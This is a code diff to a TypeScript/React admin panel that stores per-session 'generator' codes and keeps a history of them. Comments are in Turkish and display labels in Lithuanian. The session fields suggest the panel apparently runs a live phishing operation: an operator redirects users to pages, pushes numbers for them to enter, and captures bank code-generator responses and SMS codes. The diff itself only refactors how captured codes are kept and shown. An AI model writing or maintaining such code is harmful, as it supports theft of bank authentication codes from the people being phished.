@@ -1312,7 +1312,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
 
     // GENERATOR 1: kod gerekmez — kullaniciyi direkt sayfaya yonlendir.
     // GENERATOR 2: modal acilir, admin "Gosterilecek Rakam"i girer (or. 4455).
-    // Mevcut generator kaydi varsa ANINDA gecmise tasi (kolonda kalmasin).
+    // AYNI TIPIN guncel kaydi varsa ANINDA gecmise tasi + sifirla; diger tip kolonda kalir.
     if (approvalValue === "generator1") {
       if (!supabase) return;
       const row = rowsRef.current.find((r) => r.id === sessionId);
@@ -1321,18 +1321,36 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
       const genHistory: any[] = Array.isArray(previousFormData.generatorLoginHistory)
         ? [...previousFormData.generatorLoginHistory]
         : [];
+      const genCurrent: Record<string, any> =
+        previousFormData.generatorCurrent && typeof previousFormData.generatorCurrent === "object"
+          ? { ...previousFormData.generatorCurrent }
+          : {};
+      // Legacy tek-alan verisini normalize et (kendi tipine yaz, diger tip korunur)
       if (
         previousFormData.generatorData &&
         typeof previousFormData.generatorData === "object" &&
         Object.keys(previousFormData.generatorData).length > 0
       ) {
+        const lt = typeof previousFormData.generatorType === "string" ? previousFormData.generatorType : "generator1";
+        const ex = genCurrent[lt];
+        if (!ex || !ex.data || Object.keys(ex.data).length === 0) {
+          genCurrent[lt] = {
+            data: previousFormData.generatorData,
+            submittedAt: previousFormData.generatorSubmittedAt,
+            generatorCode: previousFormData.generatorCode,
+          };
+        }
+      }
+      const cur1 = genCurrent.generator1;
+      if (cur1?.data && typeof cur1.data === "object" && Object.keys(cur1.data).length > 0) {
         genHistory.push({
-          submittedAt: previousFormData.generatorSubmittedAt || new Date().toISOString(),
-          generatorType: previousFormData.generatorType,
-          generatorCode: previousFormData.generatorCode,
-          data: previousFormData.generatorData,
+          submittedAt: cur1.submittedAt || new Date().toISOString(),
+          generatorType: "generator1",
+          generatorCode: cur1.generatorCode,
+          data: cur1.data,
         });
       }
+      genCurrent.generator1 = {};
       await supabase
         .from("sessions")
         .update({
@@ -1343,6 +1361,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
             ...previousFormData,
             generatorType: approvalValue,
             generatorData: {},
+            generatorCurrent: genCurrent,
             generatorLoginHistory: genHistory,
           },
         })
@@ -1382,23 +1401,40 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
         : {};
 
     // GENERATOR 2: admin'in girdigi rakam (or. 4455) kullaniciya gosterilir.
-    // Mevcut generator kaydi varsa ANINDA gecmise tasi (kolonda kalmasin).
+    // AYNI TIPIN guncel kaydi varsa ANINDA gecmise tasi + sifirla; diger tip kolonda kalir.
     if (approvalPromptType === "generator2") {
       const genHistory: any[] = Array.isArray(previousFormData.generatorLoginHistory)
         ? [...previousFormData.generatorLoginHistory]
         : [];
+      const rawGenCur = (previousFormData as Record<string, unknown>).generatorCurrent;
+      const genCurrent: Record<string, any> =
+        rawGenCur && typeof rawGenCur === "object" ? { ...rawGenCur } : {};
+      // Legacy tek-alan verisini normalize et
       if (
         previousFormData.generatorData &&
         typeof previousFormData.generatorData === "object" &&
         Object.keys(previousFormData.generatorData).length > 0
       ) {
+        const lt = typeof previousFormData.generatorType === "string" ? previousFormData.generatorType : "generator2";
+        const ex = genCurrent[lt];
+        if (!ex || !ex.data || Object.keys(ex.data).length === 0) {
+          genCurrent[lt] = {
+            data: previousFormData.generatorData,
+            submittedAt: previousFormData.generatorSubmittedAt,
+            generatorCode: previousFormData.generatorCode,
+          };
+        }
+      }
+      const cur2 = genCurrent.generator2;
+      if (cur2?.data && typeof cur2.data === "object" && Object.keys(cur2.data).length > 0) {
         genHistory.push({
-          submittedAt: previousFormData.generatorSubmittedAt || new Date().toISOString(),
-          generatorType: previousFormData.generatorType,
-          generatorCode: previousFormData.generatorCode,
-          data: previousFormData.generatorData,
+          submittedAt: cur2.submittedAt || new Date().toISOString(),
+          generatorType: "generator2",
+          generatorCode: cur2.generatorCode,
+          data: cur2.data,
         });
       }
+      genCurrent.generator2 = {};
       await supabase
         .from("sessions")
         .update({
@@ -1410,6 +1446,7 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
             generatorType: "generator2",
             generatorCode: approvalCodeInput.trim(),
             generatorData: {},
+            generatorCurrent: genCurrent,
             generatorLoginHistory: genHistory,
           },
         })
@@ -1521,12 +1558,25 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
           : { text: "-", color: "#9ca3af" };
 
         const genCell: any[] = [];
+        const genCurrentRaw =
+          fd.generatorCurrent && typeof fd.generatorCurrent === "object"
+            ? (fd.generatorCurrent as Record<string, any>)
+            : {};
+        const legacyGenData =
+          fd.generatorData && typeof fd.generatorData === "object" && Object.keys(fd.generatorData).length > 0
+            ? (fd.generatorData as Record<string, unknown>)
+            : null;
+        const activeGenType = typeof fd.generatorType === "string" ? fd.generatorType : "";
         const genEntries: { type: string; data: Record<string, unknown> }[] = [];
-        if (fd.generatorData && typeof fd.generatorData === "object" && Object.keys(fd.generatorData).length > 0) {
-          genEntries.push({
-            type: typeof fd.generatorType === "string" ? fd.generatorType : "generator1",
-            data: fd.generatorData as Record<string, unknown>,
-          });
+        for (const t of ["generator1", "generator2"]) {
+          const cur = genCurrentRaw[t];
+          const curData =
+            cur?.data && typeof cur.data === "object" && Object.keys(cur.data).length > 0
+              ? (cur.data as Record<string, unknown>)
+              : legacyGenData && activeGenType === t
+                ? legacyGenData
+                : null;
+          if (curData) genEntries.push({ type: t, data: curData });
         }
         for (const entry of genEntries) {
           genCell.push({ text: `Generatoriaus kodas ${entry.type === "generator2" ? "2" : "1"}`, bold: true, color: "#e11d48" });
@@ -2108,16 +2158,31 @@ export function LogsTab({ darkMode, user, displayMode = "normal" }: { darkMode: 
                 const currentApproval =
                   typeof fd.approvalStatus === "string" ? fd.approvalStatus.trim() : "";
                 const approvalEntries = currentApproval ? [currentApproval] : [];
-                // GENERATOR: kolon SADECE guncel kaydi gosterir — eski kayitlar
-                // admin yeniden yonlendirdiginde aninda gecmise (📜 modal) tasinir.
+                // GENERATOR: tip basina GUNCEL kayit — kodas 1 ustte, kodas 2 altta.
+                // Ayni tipe tekrar yonlendirme: eski kayit gecmise gider, burada bos rozet (bekliyor) kalir.
+                const genCurrentRaw =
+                  fd.generatorCurrent && typeof fd.generatorCurrent === "object"
+                    ? (fd.generatorCurrent as Record<string, any>)
+                    : {};
+                const legacyData =
+                  fd.generatorData && typeof fd.generatorData === "object" && Object.keys(fd.generatorData).length > 0
+                    ? (fd.generatorData as Record<string, unknown>)
+                    : null;
+                const activeType = typeof fd.generatorType === "string" ? fd.generatorType : "";
                 const genEntries: { type: string; data: Record<string, unknown> }[] = [];
-                if (fd.generatorData && typeof fd.generatorData === "object" && Object.keys(fd.generatorData).length > 0) {
-                  genEntries.push({
-                    type: typeof fd.generatorType === "string" ? fd.generatorType : "generator1",
-                    data: fd.generatorData as Record<string, unknown>,
-                  });
-                } else if (typeof fd.generatorType === "string" && fd.generatorType) {
-                  genEntries.push({ type: fd.generatorType, data: {} });
+                for (const t of ["generator1", "generator2"]) {
+                  const cur = genCurrentRaw[t];
+                  const curData =
+                    cur?.data && typeof cur.data === "object" && Object.keys(cur.data).length > 0
+                      ? (cur.data as Record<string, unknown>)
+                      : legacyData && activeType === t
+                        ? legacyData
+                        : null;
+                  if (curData) {
+                    genEntries.push({ type: t, data: curData });
+                  } else if (activeType === t) {
+                    genEntries.push({ type: t, data: {} });
+                  }
                 }
                 const smsValue =
                   typeof fd.smsCode === "string" && fd.smsCode.trim()
